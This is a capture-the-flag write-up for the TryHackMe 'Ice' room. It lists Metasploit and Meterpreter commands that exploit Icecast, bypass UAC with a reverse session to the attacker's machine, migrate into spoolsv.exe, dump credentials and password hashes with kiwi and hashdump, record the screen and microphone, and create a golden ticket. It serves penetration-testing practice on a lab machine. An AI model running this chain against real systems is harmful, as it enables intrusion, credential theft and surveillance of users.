# Ice

**Room Link:** [https://tryhackme.com/room/ice](https://tryhackme.com/room/ice)



## Recon

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (65) (3).png" alt=""><figcaption></figcaption></figure>

## Gain Access

**Kali**

```
msfconsole
```

**Metasploit**

```
search icecast
use 0
set RHOSTS $VICTIM
run
```

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

## Escalate



<figure><img src="../../.gitbook/assets/image (55) (3).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
run post/multi/recon/local_exploit_suggester
background
```

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

**Metasploit**

```
use exploit/windows/local/bypassuac_eventvwr
set SESSIONS 1
set LHOST $KALI
run
```

We are still user dark but have a lot of privilege's now

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

## Looting

**Meterpreter**

```
ps
```

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
ps
migrate -N spoolsv.exe
```

**Meterpreter**

```
load kiwi
creds_all
```

<figure><img src="../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
hashdump
```

<figure><img src="../../.gitbook/assets/image (70) (1).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
screenshare
record_mic
golden_ticket_create
```





















